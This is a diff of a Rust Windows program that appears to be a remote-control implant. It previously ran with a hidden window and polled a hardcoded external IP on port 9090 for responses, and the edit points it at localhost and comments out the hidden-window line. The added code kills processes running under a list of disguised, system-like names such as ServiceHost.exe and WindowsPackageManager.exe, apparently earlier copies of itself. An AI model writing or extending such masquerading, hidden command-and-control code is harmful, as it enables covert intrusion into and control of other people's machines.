@@ -1,5 +1,4 @@
-
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 use std::error::Error;
 use std::os::windows::process::CommandExt;
@@ -19,15 +18,33 @@ fn main() {
     let binding = env::current_exe().unwrap();
     let exe_path= Path::new(&binding);
 
-    let exe_name = exe_path.file_name().unwrap();
+
+    let mut variants = vec![{exe_path.file_name().unwrap().to_str().unwrap()}];
+
+    variants.append(&mut vec!["WindowsPackageManager.exe"]);
+    variants.append(&mut vec!["winman.exe"]);
+    variants.append(&mut vec!["MicrosoftExtendedRuntime.exe"]);
+    variants.append(&mut vec!["MicrosoftRuntimeEnvironment.exe"]);
+    variants.append(&mut vec!["Mystify.scr"]);
+    variants.append(&mut vec!["screensaver.scr"]);
+    variants.append(&mut vec!["MedalHelper.exe"]);
+    variants.append(&mut vec!["ServiceHost.exe"]);
+    variants.append(&mut vec!["FATF.exe"]);
+    variants.append(&mut vec!["ProgramHelper.exe"]);
+    variants.append(&mut vec!["SceneRuntimeHelper.exe"]);
+    variants.append(&mut vec!["LibraryFileHandle.exe"]);
+    variants.append(&mut vec!["Updater001.exe"]);
+    variants.append(&mut vec!["ImageResponseFrame.exe"]);
 
     let current_pid = get_current_pid().unwrap();
 
-    for process in s.processes_by_name(exe_name) {
-        if process.pid() ==current_pid{
-            continue;
+    for variant in variants {
+        for process in s.processes_by_name(variant.as_ref()) {
+            if process.pid() == current_pid {
+                continue;
+            }
+            process.kill();
         }
-        process.kill();
     }
 
     loop {
@@ -59,7 +76,7 @@ fn main() {
 }
 
 fn get_request_response(string: &str) -> Result<String, Box<dyn Error>>{
-    let response = reqwest::blocking::get(format!("http://24.4.89.35:9090/{string}"))?;
+    let response = reqwest::blocking::get(format!("http://127.0.0.1:9090/{string}"))?;
     let text = response.text()?;
 
     Ok(text)
